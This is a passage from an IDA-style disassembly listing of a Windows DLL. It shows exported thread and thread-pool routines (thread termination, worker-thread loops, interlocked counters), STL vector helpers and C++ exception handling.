		push	[ebp+dwMilliseconds] ; dwMilliseconds
		lea	ecx, [ebp+var_C]
		push	dword ptr [esi+18h] ; pHandles
		call	Ordinal1271
		mov	esi, eax
		neg	esi
		sbb	esi, esi
		lea	ecx, [ebp+var_C]
		inc	esi
		call	Ordinal1268
		mov	eax, esi

loc_6AF4FE50:				; CODE XREF: Ordinal1386+13j
		pop	esi
		leave
		retn	4
Ordinal1386	endp

; Exported entry 1388.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1388(char dwMilliseconds)
		public Ordinal1388
Ordinal1388	proc near		; CODE XREF: Ordinal1101+AAp
					; Ordinal1382+11p
					; DATA XREF: ...

var_8		= dword	ptr -8
var_4		= dword	ptr -4
dwMilliseconds	= byte ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		push	esi
		mov	esi, ecx
		call	Ordinal1394
		test	eax, eax
		jnz	short loc_6AF4FE7D
		mov	eax, [esi+18h]
		test	eax, eax
		jz	short loc_6AF4FE78
		push	eax		; hObject
		call	ds:CloseHandle
		and	dword ptr [esi+18h], 0

loc_6AF4FE78:				; CODE XREF: Ordinal1388+16j
		xor	eax, eax
		inc	eax
		jmp	short loc_6AF4FEDD
; ---------------------------------------------------------------------------

loc_6AF4FE7D:				; CODE XREF: Ordinal1388+Fj
		mov	eax, [esi+24h]
		push	ebx
		mov	ebx, [esi+1Ch]
		mov	[ebp+var_8], eax
		mov	eax, [esi]
		push	edi
		mov	edi, [esi+18h]
		mov	ecx, esi
		call	dword ptr [eax+8]
		push	dword ptr [ebp+dwMilliseconds] ; dwMilliseconds
		mov	ecx, esi
		mov	[ebp+var_4], 1
		call	Ordinal1386
		test	eax, eax
		jnz	short loc_6AF4FEC5
		push	ebx
		push	dword ptr [ebp+dwMilliseconds] ; Args
		push	offset aCthreadTermina ; "CThread::Terminate() : WaitForExit(%lu)"...
		call	sub_6AF3101A
		add	esp, 0Ch
		push	0FFFFFFFFh	; dwExitCode
		push	edi		; hThread
		call	ds:TerminateThread
		and	[ebp+var_4], 0

loc_6AF4FEC5:				; CODE XREF: Ordinal1388+50j
		cmp	[ebp+var_8], 0
		pop	edi
		pop	ebx
		jnz	short loc_6AF4FEDA
		push	dword ptr [esi+18h] ; hObject
		call	ds:CloseHandle
		and	dword ptr [esi+18h], 0

loc_6AF4FEDA:				; CODE XREF: Ordinal1388+76j
		mov	eax, [ebp+var_4]

loc_6AF4FEDD:				; CODE XREF: Ordinal1388+26j
		pop	esi
		leave
		retn	4
Ordinal1388	endp

; Exported entry 1382.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1382
Ordinal1382	proc near		; CODE XREF: Ordinal478+23j
					; Ordinal853+21j ...
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+24h], 0
		mov	dword ptr [esi], offset	off_6AF60600
		jnz	short loc_6AF4FEF8
		push	0		; dwMilliseconds
		call	Ordinal1388

loc_6AF4FEF8:				; CODE XREF: Ordinal1382+Dj
		mov	eax, [esi+18h]
		test	eax, eax
		jz	short loc_6AF4FF0A
		push	eax		; hObject
		call	ds:CloseHandle
		and	dword ptr [esi+18h], 0

loc_6AF4FF0A:				; CODE XREF: Ordinal1382+1Bj
		lea	ecx, [esi+0Ch]
		mov	dword ptr [esi+20h], offset off_6AF605FC
		call	Ordinal1315
		lea	ecx, [esi+4]
		pop	esi
		jmp	Ordinal1221
Ordinal1382	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4FF22(void *, char)
sub_6AF4FF22	proc near		; DATA XREF: .rdata:off_6AF60600o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1382
		test	[esp+4+arg_0], 1
		jz	short loc_6AF4FF38
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF4FF38:				; CODE XREF: sub_6AF4FF22+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4FF22	endp

; Exported entry 1400.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1400
Ordinal1400	proc near		; CODE XREF: Ordinal1418+45p
					; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, ecx
		call	Ordinal1381
		xor	eax, eax
		mov	[esi+38h], eax
		mov	[esi+3Ch], eax
		mov	[esi+40h], eax
		mov	dword ptr [esi], offset	off_6AF60808
		mov	eax, esi
		pop	esi
		retn
Ordinal1400	endp

; Exported entry 1401.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1401
Ordinal1401	proc near		; CODE XREF: sub_6AF50288+3p
					; DATA XREF: .rdata:off_6AF66098o
		mov	dword ptr [ecx], offset	off_6AF60808
		jmp	Ordinal1382
Ordinal1401	endp

; Exported entry 1402.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal1402(int, int, LPSECURITY_ATTRIBUTES lpThreadAttributes,	SIZE_T dwStackSize, int)
		public Ordinal1402
Ordinal1402	proc near		; DATA XREF: .rdata:6AF60820o
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
lpThreadAttributes= dword ptr  10h
dwStackSize	= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_10]	; int
		mov	eax, [ebp+arg_0]
		push	[ebp+dwStackSize] ; dwStackSize
		mov	[ecx+38h], eax
		mov	eax, [ebp+arg_4]
		push	[ebp+lpThreadAttributes] ; lpThreadAttributes
		mov	[ecx+3Ch], eax
		call	Ordinal1383
		pop	ebp
		retn	14h
Ordinal1402	endp

; Exported entry 1403.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1403
Ordinal1403	proc near		; CODE XREF: Ordinal1416+B7p
					; DATA XREF: .rdata:off_6AF66098o
		push	0		; Value
		add	ecx, 40h
		push	ecx		; Addend
		call	ds:InterlockedExchangeAdd
		xor	ecx, ecx
		test	eax, eax
		setnle	cl
		mov	eax, ecx
		retn
Ordinal1403	endp

; Exported entry 1407.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1407
Ordinal1407	proc near		; CODE XREF: Ordinal1404+16p
					; Ordinal1404+60p ...
		push	esi
		push	edi
		mov	esi, ecx
		lea	edi, [esi+40h]
		push	edi		; lpAddend
		call	ds:InterlockedIncrement
		mov	ecx, [esi+38h]
		mov	eax, [ecx]
		call	dword ptr [eax+18h]
		push	edi		; lpAddend
		call	ds:InterlockedDecrement
		pop	edi
		pop	esi
		retn
Ordinal1407	endp

; Exported entry 1413.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1413
Ordinal1413	proc near		; CODE XREF: Ordinal1419+3p
					; Ordinal1410+34p
					; DATA XREF: ...
		push	0		; Value
		add	ecx, 58h
		push	ecx		; Addend
		call	ds:InterlockedExchangeAdd
		xor	ecx, ecx
		test	eax, eax
		setnle	cl
		mov	eax, ecx
		retn
Ordinal1413	endp

; Exported entry 1414.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1414
Ordinal1414	proc near		; DATA XREF: .rdata:off_6AF66098o
		lea	eax, [ecx+5Ch]
		retn
Ordinal1414	endp

; Exported entry 1415.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1415
Ordinal1415	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	0		; Value
		add	ecx, 58h
		push	ecx		; Addend
		call	ds:InterlockedExchangeAdd
		retn
Ordinal1415	endp

; Exported entry 1417.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1417
Ordinal1417	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	0		; Value
		add	ecx, 54h
		push	ecx		; Addend
		call	ds:InterlockedExchangeAdd
		retn
Ordinal1417	endp

; Exported entry 1418.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1418
Ordinal1418	proc near		; DATA XREF: .rdata:6AF60870o
					; .rdata:off_6AF66098o

var_64		= dword	ptr -64h
var_58		= dword	ptr -58h
var_54		= dword	ptr -54h
var_50		= byte ptr -50h
var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
Src		= byte ptr -24h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_120	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 58h
		mov	eax, ___security_cookie
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_10], esp
		mov	[ebp+var_2C], ecx
		xor	esi, esi
		push	offset aCthreadpoolAll ; "CThreadPool::AllocateThread()"
		lea	ecx, [ebp+var_50]
		mov	[ebp+var_14], eax
		mov	[ebp+var_28], esi
		call	Ordinal751
		mov	[ebp+var_4], esi
		push	44h		; Size
		mov	byte ptr [ebp+var_4], 1
		call	??2@YAPAXI@Z	; operator new(uint)
		cmp	eax, esi
		pop	ecx
		jz	short loc_6AF50040
		mov	ecx, eax
		call	Ordinal1400
		mov	[ebp+var_28], eax
		jmp	short loc_6AF50043
; ---------------------------------------------------------------------------

loc_6AF50040:				; CODE XREF: Ordinal1418+41j
		mov	[ebp+var_28], esi

loc_6AF50043:				; CODE XREF: Ordinal1418+4Dj
		cmp	[ebp+var_28], esi
		jnz	loc_6AF5010D
		lea	eax, [ebp+var_30]
		push	eax
		lea	ecx, [ebp+var_64]
		mov	[ebp+var_30], offset aBadAllocation ; "bad allocation"
		call	ds:??0exception@@QAE@ABQBD@Z ; exception::exception(char const * const &)
		push	offset dword_6AF63790
		lea	eax, [ebp+var_64]
		push	eax
		mov	[ebp+var_64], offset off_6AF5CAB8
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF50075:				; DATA XREF: .rdata:6AF64464o
		push	13h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aStdBad_alloc ; "std::bad_alloc"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	ecx, [ebp+var_54]
		mov	eax, [ecx]
		call	dword ptr [eax+4]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF5010D
		retn
; ---------------------------------------------------------------------------

loc_6AF500B8:				; DATA XREF: .rdata:6AF64474o
		push	15h
		lea	ecx, [ebp+var_50]
		call	Ordinal649
		push	offset aCatlexception ;	"CAtlException"
		lea	ecx, [ebp+var_50]
		call	Ordinal762
		mov	eax, [ebp+var_58]
		push	dword ptr [eax]
		lea	eax, [ebp+Src]
		push	offset a0x08x	; "0x%08X"
		push	eax		; LPSTR
		call	ds:wsprintfA
		add	esp, 0Ch
		lea	eax, [ebp+Src]
		push	eax		; Src
		lea	ecx, [ebp+var_50]
		call	Ordinal764
		lea	ecx, [ebp+var_50]
		call	Ordinal767
		push	eax		; Args
		push	offset aCccatchS ; "CCCATCH : %s\n"
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		mov	eax, offset loc_6AF5010D
		retn
; ---------------------------------------------------------------------------

loc_6AF5010D:				; CODE XREF: Ordinal1418+55j
					; DATA XREF: Ordinal1418+C1o ...
		lea	ecx, [ebp+var_50]
		call	Ordinal753
		test	eax, eax
		jz	short loc_6AF50125
		lea	ecx, [ebp+var_50]
		call	Ordinal752
		xor	eax, eax
		jmp	short loc_6AF50146
; ---------------------------------------------------------------------------

loc_6AF50125:				; CODE XREF: Ordinal1418+126j
		mov	eax, [ebp+var_2C]
		mov	ecx, [ebp+var_28]
		add	eax, 5Ch
		push	eax
		call	Ordinal1396
		mov	ecx, eax
		call	Ordinal1380
		lea	ecx, [ebp+var_50]
		call	Ordinal752
		mov	eax, [ebp+var_28]

loc_6AF50146:				; CODE XREF: Ordinal1418+132j
		mov	ecx, [ebp+var_C]
		mov	large fs:0, ecx
		mov	ecx, [ebp+var_14]
		call	unknown_libname_15 ; Microsoft VisualC 2-10/net	runtime
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
Ordinal1418	endp ; sp-analysis failed

; Exported entry 1419.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1419
Ordinal1419	proc near		; DATA XREF: .rdata:6AF60860o
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, ecx
		call	Ordinal1413
		test	eax, eax
		jz	short loc_6AF5017C
		push	[esp+4+arg_8]
		mov	ecx, esi
		push	[esp+8+arg_4]
		push	[esp+0Ch+arg_0]
		call	Ordinal1362

loc_6AF5017C:				; CODE XREF: Ordinal1419+Aj
		pop	esi
		retn	0Ch
Ordinal1419	endp

; Exported entry 1420.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1420
Ordinal1420	proc near		; DATA XREF: .rdata:6AF60864o
					; .rdata:off_6AF66098o
		add	ecx, 44h
		jmp	Ordinal1322
Ordinal1420	endp

; Exported entry 1421.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1421
Ordinal1421	proc near		; DATA XREF: .rdata:6AF60874o
					; .rdata:off_6AF66098o

var_10		= byte ptr -10h
lpAddend	= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	esi
		mov	esi, ecx
		lea	eax, [esi+54h]
		push	eax		; lpAddend
		mov	[ebp+lpAddend],	eax
		call	ds:InterlockedIncrement
		mov	eax, [esi]
		lea	ecx, [ebp+var_10]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		test	eax, eax
		jz	short loc_6AF501D6
		push	ebx
		push	edi
		lea	edi, [esi+4Ch]

loc_6AF501B2:				; CODE XREF: Ordinal1421+4Aj
		mov	ebx, [esi]
		lea	eax, [ebp+var_10]
		push	eax
		mov	eax, [edi]
		mov	ecx, edi
		call	dword ptr [eax+0Ch]
		push	eax
		mov	ecx, esi
		call	dword ptr [ebx+10h]
		mov	eax, [esi]
		lea	ecx, [ebp+var_10]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+0Ch]
		test	eax, eax
		jnz	short loc_6AF501B2
		pop	edi
		pop	ebx

loc_6AF501D6:				; CODE XREF: Ordinal1421+23j
		push	[ebp+lpAddend]	; lpAddend
		call	ds:InterlockedDecrement
		pop	esi
		leave
		retn
Ordinal1421	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF501E2	proc near		; CODE XREF: sub_6AF3D460+29p
					; sub_6AF3D777+10p ...
		mov	edx, [ecx+4]
		test	edx, edx
		jnz	short loc_6AF501EC
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF501EC:				; CODE XREF: sub_6AF501E2+5j
		mov	eax, [ecx+0Ch]
		sub	eax, edx
		sar	eax, 2
		retn
sub_6AF501E2	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF501F5	proc near		; CODE XREF: sub_6AF3D460+3Dp
					; sub_6AF3D460:loc_6AF3D4B4p ...
		mov	edx, [ecx+4]
		test	edx, edx
		jnz	short loc_6AF501FF
		xor	eax, eax
		retn
; ---------------------------------------------------------------------------

loc_6AF501FF:				; CODE XREF: sub_6AF501F5+5j
		mov	eax, [ecx+8]
		sub	eax, edx
		sar	eax, 2
		retn
sub_6AF501F5	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn bp-based	frame

sub_6AF50208	proc near		; CODE XREF: sub_6AF503C8+36p

var_50		= dword	ptr -50h
var_28		= byte ptr -28h
var_4		= dword	ptr -4

		mov	eax, offset unknown_libname_121	; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 44h
		push	offset aVectorTTooLong ; "vector<T> too	long"
		lea	ecx, [ebp+var_28]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_28]
		push	eax
		lea	ecx, [ebp+var_50]
		call	sub_6AF3136A
		push	offset dword_6AF61E98
		lea	eax, [ebp+var_50]
		push	eax
		mov	[ebp+var_50], offset off_6AF54898
		call	_CxxThrowException
sub_6AF50208	endp

; ---------------------------------------------------------------------------
		db 0CCh

; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_6AF50249(void	*Src, int, int)
sub_6AF50249	proc near		; CODE XREF: sub_6AF5031F+10p

Src		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	eax, [esp+arg_4]
		sub	eax, [esp+Src]
		mov	ecx, [esp+arg_8]
		sar	eax, 2
		shl	eax, 2
		push	eax		; Size
		push	[esp+4+Src]	; Src
		sub	ecx, eax
		push	ecx		; Dst
		call	ds:memmove
		add	esp, 0Ch
		retn
sub_6AF50249	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF5026D	proc near		; CODE XREF: sub_6AF33A07+92p
					; sub_6AF33A07+A5p ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		mov	ecx, [esp+arg_4]
		test	ecx, ecx
		jbe	short locret_6AF50287
		mov	eax, [esp+arg_0]

loc_6AF50279:				; CODE XREF: sub_6AF5026D+18j
		mov	edx, [esp+arg_8]
		mov	edx, [edx]
		mov	[eax], edx
		add	eax, 4
		dec	ecx
		jnz	short loc_6AF50279

locret_6AF50287:			; CODE XREF: sub_6AF5026D+6j
		retn
sub_6AF5026D	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF50288(void *, char)
sub_6AF50288	proc near		; DATA XREF: .rdata:off_6AF60808o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal1401
		test	[esp+4+arg_0], 1
		jz	short loc_6AF5029E
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF5029E:				; CODE XREF: sub_6AF50288+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF50288	endp

; Exported entry 1404.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1404
Ordinal1404	proc near		; DATA XREF: .rdata:6AF60814o
					; .rdata:off_6AF66098o

var_14		= byte ptr -14h
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		sub	esp, 14h
		push	esi
		push	offset aCworkerthreadR ; "CWorkerThread::Run()\n"
		mov	esi, ecx
		call	sub_6AF31006
		pop	ecx
		mov	ecx, esi
		call	Ordinal1407
		lea	ecx, [esi+4]
		mov	eax, [ecx]
		call	dword ptr [eax+0Ch]
		push	0
		push	dword ptr [esi+2Ch]
		mov	[ebp+var_8], eax
		mov	eax, [esi+3Ch]
		lea	ecx, [ebp+var_14]
		mov	[ebp+var_4], eax
		call	Ordinal1267

loc_6AF502DD:				; CODE XREF: Ordinal1404+65j
		mov	ecx, esi
		call	Ordinal1395
		test	eax, eax
		jnz	short loc_6AF5030B
		push	eax
		push	0FFFFFFFFh
		push	eax
		lea	eax, [ebp+var_8]
		push	eax
		push	2
		lea	ecx, [ebp+var_14]
		call	Ordinal1269
		sub	eax, 0
		jz	short loc_6AF5030B
		dec	eax
		jnz	short loc_6AF5030B
		mov	ecx, esi
		call	Ordinal1407
		jmp	short loc_6AF502DD
; ---------------------------------------------------------------------------

loc_6AF5030B:				; CODE XREF: Ordinal1404+42j
					; Ordinal1404+59j ...
		mov	ecx, esi
		call	Ordinal1407
		lea	ecx, [ebp+var_14]
		call	Ordinal1268
		xor	eax, eax
		pop	esi
		leave
		retn
Ordinal1404	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_6AF5031F(void	*Src, int, int)
sub_6AF5031F	proc near		; CODE XREF: sub_6AF503C8+15Bp

var_4		= dword	ptr -4
Src		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		push	[ebp+var_4]
		push	[ebp+arg_8]	; int
		push	[ebp+arg_4]	; int
		push	[ebp+Src]	; Src
		call	sub_6AF50249
		add	esp, 10h
		leave
		retn
sub_6AF5031F	endp

; Exported entry 1411.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1411
Ordinal1411	proc near		; CODE XREF: Ordinal1412+Bp
					; DATA XREF: .rdata:off_6AF66098o

var_C		= byte ptr -0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		push	edi
		mov	esi, ecx
		push	1
		lea	ecx, [esi+4Ch]
		call	Ordinal1223
		push	0		; Value
		lea	eax, [esi+58h]
		push	eax		; Target
		call	ds:InterlockedExchange
		push	0
		push	0FFFFFFFFh
		lea	eax, [esi+74h]
		push	eax
		lea	ecx, [ebp+var_C]
		call	Ordinal1228
		mov	edi, [esi+38h]
		jmp	short loc_6AF50378
; ---------------------------------------------------------------------------

loc_6AF5036E:				; CODE XREF: Ordinal1411+42j
		mov	ecx, [edi]
		mov	eax, [ecx]
		call	dword ptr [eax+8]
		add	edi, 4

loc_6AF50378:				; CODE XREF: Ordinal1411+33j
		cmp	edi, [esi+3Ch]
		jnz	short loc_6AF5036E
		lea	ecx, [ebp+var_C]
		call	Ordinal1230
		pop	edi
		pop	esi
		leave
		retn
Ordinal1411	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF50389	proc near		; CODE XREF: Ordinal795+F3p
					; Ordinal795+11Ep ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF5039A
		push	eax		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF5039A:				; CODE XREF: sub_6AF50389+8j
		and	dword ptr [esi+4], 0
		and	dword ptr [esi+8], 0
		and	dword ptr [esi+0Ch], 0
		pop	esi
		retn
sub_6AF50389	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF503A8	proc near		; CODE XREF: sub_6AF503C8+9Ep
					; sub_6AF503C8+11Ep ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		mov	esi, [esp+4+arg_4]
		push	edi
		push	[esp+8+arg_8]
		mov	edi, [esp+0Ch+arg_0]
		push	esi
		push	edi
		call	sub_6AF5026D
		add	esp, 0Ch
		lea	eax, [edi+esi*4]
		pop	edi
		pop	esi
		retn	0Ch
sub_6AF503A8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __thiscall sub_6AF503C8(int, int Src, int, int)
sub_6AF503C8	proc near		; CODE XREF: sub_6AF50542+27p

Src		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_8]
		mov	eax, [eax]
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	[ebp+arg_8], eax
		call	sub_6AF501E2
		mov	edi, [ebp+arg_4]
		test	edi, edi
		mov	ebx, eax
		jz	loc_6AF5053B
		mov	ecx, esi
		call	sub_6AF501F5
		mov	ecx, 3FFFFFFFh
		sub	ecx, eax
		cmp	ecx, edi
		mov	ecx, esi
		jnb	short loc_6AF50403
		call	sub_6AF50208
; ---------------------------------------------------------------------------

loc_6AF50403:				; CODE XREF: sub_6AF503C8+34j
		call	sub_6AF501F5
		add	eax, edi
		cmp	ebx, eax
		jnb	loc_6AF504A8
		mov	eax, ebx
		shr	eax, 1
		mov	ecx, 3FFFFFFFh
		sub	ecx, eax
		cmp	ecx, ebx
		jnb	short loc_6AF50425
		xor	ebx, ebx
		jmp	short loc_6AF50427
; ---------------------------------------------------------------------------

loc_6AF50425:				; CODE XREF: sub_6AF503C8+57j
		add	ebx, eax

loc_6AF50427:				; CODE XREF: sub_6AF503C8+5Bj
		mov	ecx, esi
		call	sub_6AF501F5
		add	eax, edi
		cmp	ebx, eax
		jnb	short loc_6AF5043F
		mov	ecx, esi
		call	sub_6AF501F5
		mov	ebx, eax
		add	ebx, edi

loc_6AF5043F:				; CODE XREF: sub_6AF503C8+6Aj
		shl	ebx, 2
		push	ebx		; Size
		mov	[ebp+arg_4], ebx
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	ebx, eax
		mov	eax, [esi+4]
		push	esi		; int
		push	ebx		; Dst
		push	[ebp+Src]	; int
		push	eax		; Src
		call	sub_6AF335CC
		add	esp, 14h
		lea	ecx, [ebp+arg_8]
		push	ecx
		push	edi
		push	eax
		mov	ecx, esi
		call	sub_6AF503A8
		push	esi		; int
		push	eax		; Dst
		push	dword ptr [esi+8] ; int
		push	[ebp+Src]	; Src
		call	sub_6AF335CC
		add	esp, 10h
		mov	ecx, esi
		call	sub_6AF501F5
		add	edi, eax
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF50492
		push	eax		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF50492:				; CODE XREF: sub_6AF503C8+C1j
		mov	eax, [ebp+arg_4]
		add	eax, ebx
		mov	[esi+0Ch], eax
		lea	eax, [ebx+edi*4]
		mov	[esi+8], eax
		mov	[esi+4], ebx
		jmp	loc_6AF5053B
; ---------------------------------------------------------------------------

loc_6AF504A8:				; CODE XREF: sub_6AF503C8+44j
		mov	ecx, [esi+8]
		mov	ebx, [ebp+Src]
		mov	eax, ecx
		sub	eax, ebx
		sar	eax, 2
		cmp	eax, edi
		mov	[ebp+arg_4], ecx
		push	esi		; int
		jnb	short loc_6AF50506
		mov	eax, edi
		shl	eax, 2
		mov	[ebp+Src], eax
		add	eax, ebx
		push	eax		; Dst
		push	ecx		; int
		push	ebx		; Src
		call	sub_6AF335CC
		mov	eax, [esi+8]
		add	esp, 10h
		lea	ecx, [ebp+arg_8]
		push	ecx
		mov	ecx, eax
		sub	ecx, ebx
		sar	ecx, 2
		sub	edi, ecx
		push	edi
		push	eax
		mov	ecx, esi
		call	sub_6AF503A8
		mov	eax, [ebp+Src]
		add	[esi+8], eax
		mov	esi, [esi+8]
		sub	esi, eax
		jmp	short loc_6AF50500
; ---------------------------------------------------------------------------

loc_6AF504F8:				; CODE XREF: sub_6AF503C8+13Aj
		mov	eax, [ebp+arg_8]
		mov	[ebx], eax
		add	ebx, 4

loc_6AF50500:				; CODE XREF: sub_6AF503C8+12Ej
		cmp	ebx, esi
		jnz	short loc_6AF504F8
		jmp	short loc_6AF5053B
; ---------------------------------------------------------------------------

loc_6AF50506:				; CODE XREF: sub_6AF503C8+F3j
		push	ecx		; Dst
		mov	[ebp+Src], ecx
		shl	edi, 2
		sub	[ebp+Src], edi
		push	ecx		; int
		push	[ebp+Src]	; Src
		call	sub_6AF335CC
		push	[ebp+arg_4]	; int
		mov	[esi+8], eax
		push	[ebp+Src]	; int
		push	ebx		; Src
		call	sub_6AF5031F
		add	esp, 1Ch
		add	edi, ebx
		jmp	short loc_6AF50537
; ---------------------------------------------------------------------------

loc_6AF5052F:				; CODE XREF: sub_6AF503C8+171j
		mov	eax, [ebp+arg_8]
		mov	[ebx], eax
		add	ebx, 4

loc_6AF50537:				; CODE XREF: sub_6AF503C8+165j
		cmp	ebx, edi
		jnz	short loc_6AF5052F

loc_6AF5053B:				; CODE XREF: sub_6AF503C8+1Cj
					; sub_6AF503C8+DBj ...
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn	0Ch
sub_6AF503C8	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF50542(int, int,	int Src, int)
sub_6AF50542	proc near		; CODE XREF: sub_6AF50638+35p

arg_0		= dword	ptr  4
Src		= dword	ptr  8
arg_8		= dword	ptr  0Ch

		push	esi
		push	edi
		mov	edi, ecx
		call	sub_6AF501F5
		test	eax, eax
		jnz	short loc_6AF50553
		xor	esi, esi
		jmp	short loc_6AF5055D
; ---------------------------------------------------------------------------

loc_6AF50553:				; CODE XREF: sub_6AF50542+Bj
		mov	esi, [esp+8+Src]
		sub	esi, [edi+4]
		sar	esi, 2

loc_6AF5055D:				; CODE XREF: sub_6AF50542+Fj
		push	[esp+8+arg_8]	; int
		mov	ecx, edi	; int
		push	1		; int
		push	[esp+10h+Src]	; Src
		call	sub_6AF503C8
		mov	eax, [edi+4]
		lea	ecx, [eax+esi*4]
		mov	eax, [esp+8+arg_0]
		pop	edi
		mov	[eax], ecx
		pop	esi
		retn	0Ch
sub_6AF50542	endp

; Exported entry 1408.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal1408
Ordinal1408	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		push	edi
		mov	esi, ecx
		call	Ordinal1360
		mov	dword ptr [esi], offset	off_6AF6085C
		xor	edi, edi
		lea	ecx, [esi+44h]
		mov	[esi+38h], edi
		mov	[esi+3Ch], edi
		mov	[esi+40h], edi
		call	Ordinal1313
		push	edi
		lea	ecx, [esi+4Ch]
		call	Ordinal1220
		lea	ecx, [esi+5Ch]
		mov	[esi+54h], edi
		mov	[esi+58h], edi
		call	Ordinal1377
		lea	ecx, [esi+74h]
		call	Ordinal1278
		pop	edi
		mov	eax, esi
		pop	esi
		retn
Ordinal1408	endp

; Exported entry 1412.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal1412
Ordinal1412	proc near		; CODE XREF: Ordinal1409+Bp
					; Ordinal1410+D8p
					; DATA XREF: ...

var_C		= byte ptr -0Ch
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		call	Ordinal1411
		push	0
